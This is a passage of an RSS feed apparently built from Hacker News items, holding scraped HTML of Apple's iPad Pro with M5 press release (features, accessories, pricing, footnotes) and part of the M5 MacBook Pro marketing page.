<li>Taking advantage of Apple silicon, iPadOS 26 unlocks new capabilities for creative pros with <strong>Background Tasks</strong>, more control over their <strong>audio input</strong>, and the ability to capture high-quality recordings with<strong> local capture</strong>.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li><strong>Apple Intelligence</strong> delivers helpful and relevant intelligence that is deeply integrated across operating systems, while taking an extraordinary step forward for privacy in AI.<sup>6</sup> New features across iPadOS 26 include <strong>Live Translation</strong> in Phone, FaceTime, and Messages;<sup>7</sup> new<strong> intelligent actions in Shortcuts</strong>; the ability to identify and automatically categorize relevant actions in <strong>Reminders</strong>; and more.</li>
</ul>
</div>
                 
             
                 <h2><strong>Advanced Accessories for iPad Pro</strong>
</h2>
                 
             
                 <div>Accessories extend the versatility of iPad Pro, opening up even more possibilities for creativity and productivity. Apple Pencil Pro and Apple Pencil (USB-C) offer users two incredible options for illustrating, note-taking, annotating, and more. The thin and light Magic Keyboard for iPad Pro provides the most advanced experience with a floating design, function row, and gorgeous aluminum palm rest. iPad Pro is also compatible with the Smart Folio for iPad Pro, which attaches magnetically and supports multiple viewing angles.
</div>
                 
             
         </div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="ipad-pro-with-m5-accessories">
            <nav role="presentation">
                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-cc420bd134260eefa600ee46ef6755fb" href="#gallery-cc420bd134260eefa600ee46ef6755fb" data-ac-gallery-trigger="gallery-cc420bd134260eefa600ee46ef6755fb"><span>Apple Pencil Pro is shown drawing on the new iPad Pro.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-575df875d0fd783d52fe803e013f2f3f" href="#gallery-575df875d0fd783d52fe803e013f2f3f" data-ac-gallery-trigger="gallery-575df875d0fd783d52fe803e013f2f3f"><span>Magic Keyboard is shown with the new iPad Pro.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-87bde0ac58f103e9369cae4cbb4b0618" href="#gallery-87bde0ac58f103e9369cae4cbb4b0618" data-ac-gallery-trigger="gallery-87bde0ac58f103e9369cae4cbb4b0618"><span>Magic Keyboard is shown in side profile with the new iPad Pro.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-6fe38632fe526f376fab2bbd2ce627eb" href="#gallery-6fe38632fe526f376fab2bbd2ce627eb" data-ac-gallery-trigger="gallery-6fe38632fe526f376fab2bbd2ce627eb"><span>A close-up on Magic Keyboard with the new iPad Pro.</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
                        <div id="gallery-cc420bd134260eefa600ee46ef6755fb" aria-labelledby="gallery-dotnav-cc420bd134260eefa600ee46ef6755fb" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:apple-pencil-pro">
                                
                                <div>
                                    <div>Apple Pencil Pro gives users incredible precision and control, with advanced features like squeeze and haptic feedback to bring their ideas to life.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/article/Apple-iPad-Pro-Apple-Pencil-Pro-251015.zip" download="" data-analytics-title="download image - Apple-iPad-Pro-Apple-Pencil-Pro-251015_big" aria-label="Download media, Apple Pencil Pro is shown drawing on the new iPad Pro."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-575df875d0fd783d52fe803e013f2f3f" aria-labelledby="gallery-dotnav-575df875d0fd783d52fe803e013f2f3f" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:magic-keyboard-01">
                                
                                <div>
                                    <div>The Magic&nbsp;Keyboard for iPad&nbsp;Pro delivers an amazing typing and trackpad experience in a sleek, portable design with an aluminum palm rest.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/article/Apple-iPad-Pro-Magic-Keyboard-01-251015.zip" download="" data-analytics-title="download image - Apple-iPad-Pro-Magic-Keyboard-01-251015_big" aria-label="Download media, Magic Keyboard is shown with the new iPad Pro."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-87bde0ac58f103e9369cae4cbb4b0618" aria-labelledby="gallery-dotnav-87bde0ac58f103e9369cae4cbb4b0618" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:magic-keyboard-02">
                                
                                <div>
                                    <div>The floating cantilever design smoothly adjusts to multiple viewing angles.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/article/Apple-iPad-Pro-Magic-Keyboard-02-251015.zip" download="" data-analytics-title="download image - Apple-iPad-Pro-Magic-Keyboard-02-251015_big" aria-label="Download media, Magic Keyboard is shown in side profile with the new iPad Pro."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-6fe38632fe526f376fab2bbd2ce627eb" aria-labelledby="gallery-dotnav-6fe38632fe526f376fab2bbd2ce627eb" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:magic-keyboard-03">
                                
                                <div>
                                    <div>A 14-key function row and large glass trackpad expand how users can work with iPad Pro, and deliver haptic feedback for precision‑based workflows and Multi‑Touch gestures.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/article/Apple-iPad-Pro-Magic-Keyboard-03-251015.zip" download="" data-analytics-title="download image - Apple-iPad-Pro-Magic-Keyboard-03-251015_big" aria-label="Download media, A close-up on Magic Keyboard with the new iPad Pro."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>iPad Pro and the Environment</strong>
</h2>
                 
             
                 <div>Apple 2030 is the company’s ambitious plan to be carbon neutral across its entire footprint by the end of this decade by reducing product emissions from their three biggest sources: materials, electricity, and transportation. The new iPad Pro is made with 30 percent recycled content by weight, including 100 percent recycled aluminum in the enclosure, 100 percent recycled rare earth elements in all magnets, and 100 percent recycled cobalt in the battery. It is manufactured with 55 percent renewable electricity, like wind and solar, across the supply chain. iPad Pro is also designed to last and offers industry-leading software support while meeting Apple’s high standards for energy efficiency and safe chemistry. The paper packaging is 100 percent fiber-based and can be easily recycled.
</div>
                 
             
         </div>
 

    
    
    


     
     
    
    
        <div>
             
                 
                 
             
                 <div><ul>
<li>Customers can pre-order iPad Pro with M5 starting today on <a href="https://www.apple.com/store/" target="_blank">apple.com/store</a>, and in the Apple Store app in 31 countries and regions, including the U.S. It will begin arriving to customers, and will be in Apple Store locations and Apple Authorized Resellers, starting Wednesday, October 22.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>The 11-inch and 13-inch iPad Pro with M5 will be available in silver and space black finishes in 256GB, 512GB, 1TB, and 2TB configurations.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>The 11-inch iPad Pro starts at&nbsp;<strong>$999</strong>&nbsp;(U.S.) for the Wi-Fi model, and&nbsp;<strong>$1,199</strong>&nbsp;(U.S.) for the Wi-Fi + Cellular model. The 13-inch iPad Pro starts at&nbsp;<strong>$1,299</strong>&nbsp;(U.S.) for the Wi-Fi model, and&nbsp;<strong>$1,499&nbsp;</strong>(U.S.) for the Wi-Fi + Cellular model. Additional technical specifications, including nano-texture glass options, are available at <a href="https://www.apple.com/store/" target="_blank">apple.com/store</a>.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>With education savings, the 11-inch iPad Pro starts at <strong>$899</strong> (U.S.), and the 13-inch iPad Pro starts at <strong>$1,199</strong> (U.S.).</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Apple Pencil Pro and Apple Pencil (USB-C) are compatible with the new iPad Pro. Apple Pencil Pro is available for <strong>$129</strong> (U.S.), and <strong>$119</strong> (U.S.) with education savings. Apple Pencil (USB-C) is available for <strong>$79</strong> (U.S.), and <strong>$69</strong> (U.S.) with education savings.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>The Magic Keyboard for iPad Pro is available in black and white finishes. The 11-inch Magic Keyboard is available for<strong> $299</strong> (U.S.), and the new 13-inch Magic Keyboard is available for <strong>$349</strong> (U.S.). With education savings, the 11-inch Magic Keyboard is available for <strong>$279 </strong>(U.S.), and the 13-inch Magic Keyboard is available for <strong>$329</strong> (U.S.).</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>The Magic Keyboard for iPad Air with M3 is now available in black, and is compatible with the 11-inch and 13-inch iPad Air. The 11-inch Magic Keyboard is available for <strong>$269</strong> (U.S.), and the 13-inch Magic Keyboard is available for <strong>$319</strong> (U.S.). With education savings, the 11-inch Magic Keyboard is available for <strong>$249</strong> (U.S.), and the 13-inch Magic Keyboard is available for <strong>$299</strong> (U.S.).</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>The Apple-designed 40W Dynamic Power Adapter with 60W Max is available for <strong>$39</strong> (U.S.).</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>AppleCare delivers exceptional service and support, with flexible options for Apple users. Customers can choose AppleCare+ to cover their new iPad, or in the U.S., AppleCare One to protect multiple products in one simple plan. Both plans include coverage for accidents like drops and spills, theft and loss protection on eligible products, battery replacement service, and 24/7 support from Apple Experts. For more information, visit <a href="https://www.apple.com/applecare/" target="_blank">apple.com/applecare</a>.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Apple offers great ways to save on the latest iPad. Customers can trade in their current iPad and get credit toward a new one by visiting the Apple Store online, the Apple Store app, or an Apple Store location. To see what their device is worth, and for terms and conditions, customers can visit <a href="https://www.apple.com/shop/trade-in/" target="_blank">apple.com/shop/trade-in</a>.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Customers in the U.S. who shop at Apple using Apple Card can pay monthly at 0 percent APR when they choose to check out with Apple Card Monthly Installments, and they’ll get 3 percent Daily Cash back — all up front. More information — including details on eligibility, exclusions, and Apple Card terms — is available at <a href="https://www.apple.com/apple-card/monthly-installments/" target="_blank">apple.com/apple-card/monthly-installments</a>.</li>
</ul>
</div>
                 
             
         </div>
 

    
    
    




    
    
        
    


    
    
    



    
    
    




    




    
    
    





    
    
    <div>
            <ol>
<li>Results are compared to iPad Pro 13-inch (M4) units with 10-core CPU and 16GB of unified memory.</li>
<li>Results are compared to iPad Pro 12.9-inch (5th generation) units with 8-core CPU and 16GB of unified memory.</li>
<li>Genmoji and Image Playground are available in English, French, German, Italian, Portuguese (Brazil), Spanish, and Japanese.</li>
<li>Testing was conducted by Apple in August and September 2025. See <a href="https://www.apple.com/ipad-pro/" target="_blank">apple.com/ipad-pro</a> for more information.</li>
<li>The 40W Dynamic Power Adapter with 60W Max is available in Canada, China mainland, Japan, Mexico, Taiwan, the Philippines, and the U.S.</li>
<li>Apple Intelligence is available in beta with support for these languages: English, French, German, Italian, Portuguese (Brazil), Spanish, Chinese (simplified), Japanese, and Korean. Some features may not be available in all regions or languages. For feature and language availability and system requirements, see <a href="https://support.apple.com/en-us/121115" target="_blank">support.apple.com/en-us/121115</a>.</li>
<li>Live Translation in Messages supports English (U.S., UK), French (France), German, Italian, Japanese, Korean, Portuguese (Brazil), Spanish (Spain), and Chinese (simplified). Live Translation in Phone and FaceTime is available for one-on-one calls in English (UK, U.S.), French (France), German (Germany), Portuguese (Brazil), and Spanish (Spain) when Apple Intelligence is enabled, on a compatible iPhone, iPad, or Mac. Later this year, Live Translation in Phone and FaceTime will add language support for Chinese (Mandarin, simplified), Chinese (Mandarin, traditional), Italian, Japanese, and Korean. Some features may not be available in all regions or languages.</li>
</ol>

        </div>



    
    
    






    















	

		
		
			
























		
		

</article>



</section>
</main>



<div>
            Stay up to date with the latest articles from Apple Newsroom.
        </div>
	

</div>]]></description>
        </item>
        <item>
            <title><![CDATA[M5 MacBook Pro (322 pts)]]></title>
            <link>https://www.apple.com/macbook-pro/</link>
            <guid>45591902</guid>
            <pubDate>Wed, 15 Oct 2025 13:10:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.apple.com/macbook-pro/">https://www.apple.com/macbook-pro/</a>, See on <a href="https://news.ycombinator.com/item?id=45591902">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main" role="main" data-page-type="overview">
		
































		
		
		
		
		<section data-anim-scroll-group="Performance" data-theme-changer="dark" data-component-list="StaggeredFadeIn">
			
			<div data-analytics-section-engagement="name:gaming">
				<div data-anim-lazy-image="">
					<picture id="overview-performance-performance-gaming-hw-1" data-lazy="">
						<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
						<img src="https://www.apple.com/v/macbook-pro/at/images/overview/performance/performance_gaming_hw__feqoxj2hplym_large.jpg" onload="window.__lp?.(event)" alt="">
					</picture>
					
					
					<p>Crimson Desert</p>
				</div>
				<p>Run graphics-intensive workflows with responsiveness that keeps up with your imagination. M5 features a GPU with enhanced shader cores and a third-generation ray tracing engine, so <span>gaming feels more immersive and realistic.</span> And Dynamic&nbsp;Caching optimizes on-chip memory to significantly increase GPU utilization — driving huge performance boosts for pro apps and&nbsp;games.</p>
			</div>
			<div data-component-list="ChipPersonas" data-analytics-section-engagement="name:three chips">
				<p>
					<h3>Three chips. <br>Second to&nbsp;none.</h3>
				</p>
				<div>
							<div>
								<div data-anim-lazy-image="" data-focus-expression="{&quot;expression&quot;: &quot;css(--vo-scroll-mx)&quot;, &quot;anchors-closest&quot;: [&quot;.sticky-container&quot;, &quot;.persona-grid&quot;], &quot;focus-enabled-when&quot;: &quot;chip-personas-enhanced&quot;}">
										<picture id="overview-performance-performance-mbp-hw-1" data-lazy="">
											<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
											<img src="https://www.apple.com/v/macbook-pro/at/images/overview/performance/performance_mbp_hw__ezbzo2rdj9me_large.jpg" onload="window.__lp?.(event)" alt="">
										</picture>
										
										<picture id="overview-performance-performance-m5-screen-1" data-lazy="">
											<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
											<img src="https://www.apple.com/v/macbook-pro/at/images/overview/performance/performance_m5_screen__bdw6k0bn36j6_large.jpg" onload="window.__lp?.(event)" alt="MacBook Pro screen showing the editing of a film titled Eternal Play in Adobe Premiere Pro">
										</picture>
										
										<p>Adobe Premiere Pro</p>
									</div>
								<div data-focus-expression="{&quot;expression&quot;: &quot;css(--vo-scroll-mx)&quot;, &quot;anchors-closest&quot;: [&quot;.sticky-container&quot;, &quot;.persona-grid&quot;], &quot;focus-enabled-when&quot;: &quot;chip-personas-enhanced&quot;, &quot;focus-target-footnote&quot;: &quot;.footnote a&quot;}">
									<div>
										<picture id="overview-performance-performance-icon-m5-1" data-lazy="">
											<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
											<img src="https://www.apple.com/v/macbook-pro/at/images/overview/performance/performance_icon_m5__dk75oifli58i_large.png" onload="window.__lp?.(event)" alt="">
										</picture>
										
										
										
										
										
									</div>
									<p>M5 brings next-generation speed and powerful on-device AI to college students, business users, and aspiring&nbsp;creators.</p>
									<ul>
										<li>Available in 14”</li>
										<li>Up to 6x faster <p>than&nbsp;M1<sup data-footnote="numbered-m5-vs-m4-vs-m1-llm-prompt"><a href="#footnote-9" aria-label="Footnote 6" data-modal-close="">6</a></sup></p></li>
									</ul>
								</div>
							</div>
							<div>
								<div data-anim-lazy-image="" data-focus-expression="{&quot;expression&quot;: &quot;css(--vo-scroll-mx-pro)&quot;, &quot;anchors-closest&quot;: [&quot;.sticky-container&quot;, &quot;.persona-grid&quot;], &quot;focus-enabled-when&quot;: &quot;chip-personas-enhanced&quot;}">
										<picture id="overview-performance-performance-mbp-hw-2" data-lazy="">
											<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
											<img src="https://www.apple.com/v/macbook-pro/at/images/overview/performance/performance_mbp_hw__ezbzo2rdj9me_large.jpg" onload="window.__lp?.(event)" alt="">
										</picture>
										
										<picture id="overview-performance-performance-m4pro-screen-1" data-lazy="">
											<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
											<img src="https://www.apple.com/v/macbook-pro/at/images/overview/performance/performance_m4pro_screen__fkqrevdr02em_large.jpg" onload="window.__lp?.(event)" alt="MacBook Pro screen showing a person coding an app for a multilingual hackathon in Xcode">
										</picture>
										
										<p>Xcode</p>
									</div>
								<div data-focus-expression="{&quot;expression&quot;: &quot;css(--vo-scroll-mx-pro)&quot;, &quot;anchors-closest&quot;: [&quot;.sticky-container&quot;, &quot;.persona-grid&quot;], &quot;focus-enabled-when&quot;: &quot;chip-personas-enhanced&quot;, &quot;focus-target-footnote&quot;: &quot;.footnote a&quot;}">
									<div>
										
										
										<picture id="overview-performance-performance-icon-m4pro-2" data-lazy="">
											<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
											<img src="https://www.apple.com/v/macbook-pro/at/images/overview/performance/performance_icon_m4pro__ez04pndyaq6a_large.png" onload="window.__lp?.(event)" alt="">
										</picture>
										
										
										
									</div>
									<p>M4&nbsp;Pro delivers even more power for scientists, engineers, software developers, and creative pros tackling intensive&nbsp;projects.</p>
									<ul>
										<li>Available in 14” and 16”</li>
										<li>Up to 3x faster than&nbsp;M1&nbsp;Pro<sup data-footnote="numbered-m4-pro-vs-m1-pro-speed"><a href="#footnote-15" aria-label="Footnote 12" data-modal-close="">12</a></sup></li>
									</ul>
								</div>
							</div>
							<div>
								<div data-anim-lazy-image="" data-focus-expression="{&quot;expression&quot;: &quot;css(--vo-scroll-mx-max)&quot;, &quot;anchors-closest&quot;: [&quot;.sticky-container&quot;, &quot;.persona-grid&quot;], &quot;focus-enabled-when&quot;: &quot;chip-personas-enhanced&quot;}">
										<picture id="overview-performance-performance-mbp-hw-3" data-lazy="">
											<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
											<img src="https://www.apple.com/v/macbook-pro/at/images/overview/performance/performance_mbp_hw__ezbzo2rdj9me_large.jpg" onload="window.__lp?.(event)" alt="">
										</picture>
										
										<picture id="overview-performance-performance-m4max-screen-1" data-lazy="">
											<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
											<img src="https://www.apple.com/v/macbook-pro/at/images/overview/performance/performance_m4max_screen__edf76j2ds002_large.jpg" onload="window.__lp?.(event)" alt="MacBook Pro screen showing a complex 3D animation of a spinning rope in Cinema 4D">
										</picture>
										
										<p>Cinema 4D</p>
									</div>
								<div data-focus-expression="{&quot;expression&quot;: &quot;css(--vo-scroll-mx-max)&quot;, &quot;anchors-closest&quot;: [&quot;.sticky-container&quot;, &quot;.persona-grid&quot;], &quot;focus-enabled-when&quot;: &quot;chip-personas-enhanced&quot;, &quot;focus-target-footnote&quot;: &quot;.footnote a&quot;}">
									<div>
										
										
										
										
										<picture id="overview-performance-performance-icon-m4max-3" data-lazy="">
											<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
											<img src="https://www.apple.com/v/macbook-pro/at/images/overview/performance/performance_icon_m4max__getmf50wffqm_large.png" onload="window.__lp?.(event)" alt="">
										</picture>
										
									</div>
									<p>Our most advanced chip ever built for a pro laptop. M4&nbsp;Max is perfect for 3D&nbsp;VFX artists, AI&nbsp;developers, and film&nbsp;composers.</p>
									<ul>
										<li>Available in 14” and 16”</li>
										<li>Up to 3.5x faster than&nbsp;M1&nbsp;Max<sup data-footnote="numbered-m4-max-vs-m1-max-speed-14"><a href="#footnote-16" aria-label="Footnote 13" data-modal-close="">13</a></sup></li>
									</ul>
								</div>
							</div>
						</div>
				
			</div>
			
		</section>
		
		<section data-anim-scroll-group="Artificial Intelligence" data-theme-changer="dark">
			<div data-anim-scroll-group="Ai" data-analytics-section-engagement="name:artificial intelligence" data-component-list="StaggeredFadeIn">
						<div data-staggered-item="">
									<div>
										<h3>AI apps on Mac. Born to run.</h3>
										<p>Mac is optimized to handle the world’s most advanced AI apps. Run image generation apps like DiffusionBee, LLM apps like Msty&nbsp;AI and LM&nbsp;Studio, and video enhancement apps like Topaz&nbsp;Video.</p>
									</div>
									<picture id="overview-artificial-intelligence-ai-features-apps-1" data-lazy="">
										<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
										<img src="https://www.apple.com/v/macbook-pro/at/images/overview/artificial-intelligence/ai_features_apps__iuy33cdt10qe_large.jpg" onload="window.__lp?.(event)" alt="A MacBook Pro screen showing a video getting enhanced with AI in Topaz Video">
									</picture>
									
								</div>
						<div data-staggered-item="">
									<div>
										<h3>AI tools in apps. Mac makes magic.</h3>
										<p>Transform vocals with AI plug-ins like MicDrop for Logic&nbsp;Pro. And make complex image modifications in seconds with Generative Fill in Adobe&nbsp;Photoshop.</p>
									</div>
									<picture id="overview-artificial-intelligence-ai-3rd-party-1" data-lazy="">
										<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
										<img src="https://www.apple.com/v/macbook-pro/at/images/overview/artificial-intelligence/ai_3rd_party__eyiaslpg07ee_large.jpg" onload="window.__lp?.(event)" alt="Screen content on MacBook Pro demonstrating MicDrop plug-in using AI features to edit a vocal recording on Logic Pro">
									</picture>
									
								</div>
					</div>
			<div data-anim-scroll-group="Apple Intelligence" data-analytics-section-engagement="name:apple intelligence" data-component-list="StaggeredFadeIn">
				<div>
						<picture id="overview-artificial-intelligence-ai-apple-intelligence-mac-1" data-lazy="">
							<source data-empty="" srcset="data:image/gif;base64,R0lGODlhAQABAHAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" media="(min-width:0px)">
							<img src="https://www.apple.com/v/macbook-pro/at/images/overview/artificial-intelligence/ai_apple_intelligence_mac__gdp94bdth9qy_large.jpg" onload="window.__lp?.(event)" alt="Apple Intelligence Writing Tools used to craft an email">
						</picture>
						
					</div>
				<div>
						
						<h3>Great powers come <br>with great privacy.</h3>
						<p>Apple&nbsp;Intelligence is <span>designed to protect your privacy at every step.</span> It’s integrated into the core of your Mac through on-device processing. So it’s aware of your personal information without collecting your personal information. And with groundbreaking Private&nbsp;Cloud&nbsp;Compute, Apple&nbsp;Intelligence can draw on larger server-based models, running on Apple&nbsp;silicon, to handle more complex requests for you while protecting your&nbsp;privacy.</p>
					</div>
			</div>
		</section>
		<div data-anim-scroll-group="Battery" data-theme-changer="dark" data-analytics-section-engagement="name:battery" data-component-list="StaggeredFadeIn">
						<p>MacBook&nbsp;Pro has the <span>longest battery life ever in a Mac</span> — up to 24 hours — and supports fast charge, allowing it to charge up to 50 percent in just 30 minutes.<sup data-footnote="numbered-fast-charge"><a href="#footnote-51" aria-label="Footnote 48" data-modal-close="">48</a></sup> All models provide the same performance whether they’re plugged in or not, so you can spend more time thinking about an outlet for your passion, not your&nbsp;laptop.</p>
						<div>
								<div>
										<figure>
											<p><span>Up to</span><span>24 hours</span><span>battery life<sup data-footnote="numbered-m5-14-battery"><a href="#footnote-6" aria-label="Footnote 3" data-modal-close="">3</a></sup></span></p>
										</figure>
									</div>
								<div>
										<figure>
											<p><span>Up to</span><span>14 more hours</span><span>than Intel-based MacBook&nbsp;Pro<sup data-footnote="numbered-m5-vs-intel-battery"><a href="#footnote-5" aria-label="Footnote 2" data-modal-close="">2</a></sup></span></p>
										</figure>
									</div>
							</div>
					</div>
		
		<section data-anim-scroll-group="Macos" data-theme-changer="dark" data-component-list="StaggeredFadeIn">
			<header data-analytics-section-engagement="name:macos tahoe intro">
				
				
			</header>
			
		</section>
		
		<div id="continuity-gallery" data-has-captions="" data-initial-index="0" data-analytics-gallery-id="continuity gallery" data-auto-play-off="true" data-auto-play-active-item="" data-component-list="StaggeredFadeIn" data-anim-scroll-group="Continuity" data-theme-changer="dark" data-analytics-section-engagement="name:mac + iphone">
							<div id="continuity-gallery-gallery-item-0" data-analytics-gallery-item-id="iphone mirroring" data-ac-gallery-item="0" role="tabpanel" aria-labelledby="continuity-gallery-tab-0">
								
								<p>Mail, Uber Eats</p>
								<div id="continuity-gallery-gallery-caption-0" data-captions-gallery-item="">
									<p>See and use your iPhone from your Mac with iPhone&nbsp;Mirroring. Even if you’re charging your phone in another room, you can still access all your favorite&nbsp;apps.<sup data-footnote="numbered-iphone-mirroring"><a href="#footnote-13" aria-label="Footnote 10" data-modal-close="">10</a></sup></p>
								</div>
							</div>
							<div id="continuity-gallery-gallery-item-1" data-analytics-gallery-item-id="live&nbsp;activities" data-ac-gallery-item="1" role="tabpanel" aria-labelledby="continuity-gallery-tab-1">
								
								<p>Uber Eats</p>
								<div id="continuity-gallery-gallery-caption-1" data-captions-gallery-item="">
									<p>Live&nbsp;Activities from your iPhone now appear on your Mac — like when your Uber&nbsp;Eats order is about to arrive. So you don’t have to reach for your phone to stay in the&nbsp;know.<sup data-footnote="numbered-iphone-mirroring"><a href="#footnote-13" aria-label="Footnote 10" data-modal-close="">10</a></sup></p>
								</div>
							</div>
							<div id="continuity-gallery-gallery-item-2" data-analytics-gallery-item-id="universal clipboard" data-ac-gallery-item="2" role="tabpanel" aria-labelledby="continuity-gallery-tab-2">
								
								<p>Notes, Microsoft PowerPoint</p>
								<div id="continuity-gallery-gallery-caption-2" data-captions-gallery-item="">
									<p>Copy images, video, or text from an app on your iPhone or iPad. Then paste into another app on your nearby Mac — or vice versa. No extra steps. It’s that&nbsp;easy.</p>
								</div>
							</div>
							<div id="continuity-gallery-gallery-item-3" data-analytics-gallery-item-id="phone app" data-ac-gallery-item="3" role="tabpanel" aria-labelledby="continuity-gallery-tab-3">
								
								<p>Phone app</p>
								<div id="continuity-gallery-gallery-caption-3" data-captions-gallery-item="">
									<p>Make and take calls right from your Mac, and access Recents, Contacts, and Voicemail. You’ll never miss a call, even if your iPhone is buried deep in your&nbsp;backpack.<sup data-footnote="numbered-same-account"><a href="#footnote-12" aria-label="Footnote 9" data-modal-close="">9</a></sup></p>
								</div>
							</div>
							<div id="continuity-gallery-gallery-item-4" data-analytics-gallery-item-id="handoff" data-ac-gallery-item="4" role="tabpanel" aria-labelledby="continuity-gallery-tab-4">
								
								<p>Mail</p>
								<div id="continuity-gallery-gallery-caption-4" data-captions-gallery-item="">
									<p>Start an email on your iPhone and finish it on your Mac. With Handoff, you can seamlessly pass what you’re doing from iPhone to Mac — or from Mac to&nbsp;iPhone.<sup data-footnote="numbered-handoff"><a href="#footnote-53" aria-label="Footnote 50" data-modal-close="">50</a></sup></p>
								</div>
							</div>
						</div>
		<div id="apps-gallery" data-has-captions="" data-initial-index="0" data-analytics-gallery-id="apps gallery" data-auto-play-off="true" data-auto-play-active-item="" data-component-list="StaggeredFadeIn" data-anim-scroll-group="Apps" data-theme-changer="dark" data-analytics-section-engagement="name:apps">
							<div id="apps-gallery-gallery-item-0" data-analytics-gallery-item-id="photo editing" data-ac-gallery-item="0" role="tabpanel" aria-labelledby="apps-gallery-tab-0">
								
								<p>Adobe Lightroom</p>
								<div id="apps-gallery-gallery-caption-0" data-captions-gallery-item="">
										<p><span>Handle large image files, no sweat.</span> Edit and retouch photos whether in the studio or on&nbsp;location. </p>
										<p>Adobe&nbsp;Lightroom, Adobe&nbsp;Photoshop, Capture&nbsp;One, Pixelmator&nbsp;Pro, Topaz&nbsp;Photo, PhotoLab&nbsp;9, and&nbsp;more.</p>
									</div>
							</div>
							<div id="apps-gallery-gallery-item-1" data-analytics-gallery-item-id="coding" data-ac-gallery-item="1" role="tabpanel" aria-labelledby="apps-gallery-tab-1">
								
								<p>Xcode</p>
								<div id="apps-gallery-gallery-caption-1" data-captions-gallery-item="">
										<p><span>Get with the program.</span> Run virtual machines and develop code across the stack. Save time with predictive code completion in&nbsp;Xcode.</p>
										<p>Xcode, Unity&nbsp;Editor, Create&nbsp;ML, TensorFlow, PyTorch, NAG&nbsp;Fortran&nbsp;Compiler, Docker, IntelliJ&nbsp;IDEA, and&nbsp;more.</p>
									</div>
							</div>
							<div id="apps-gallery-gallery-item-2" data-analytics-gallery-item-id="stem" data-ac-gallery-item="2" role="tabpanel" aria-labelledby="apps-gallery-tab-2">
								
								<p>MATLAB</p>
								<div id="apps-gallery-gallery-caption-2" data-captions-gallery-item="">
										<p><span>Make Mac your lab partner.</span> Run complex simulations or DNA sequencing or analyze large data sets in any STEM&nbsp;environment.</p>
										<p>MATLAB, Autodesk&nbsp;AutoCAD, NASA&nbsp;TetrUSS, Oxford&nbsp;Nanopore&nbsp;MinKNOW, OsiriX&nbsp;MD, Shapr3D, SurgicalAR, Vectorworks, Archicad, and&nbsp;more.</p>
									</div>
							</div>
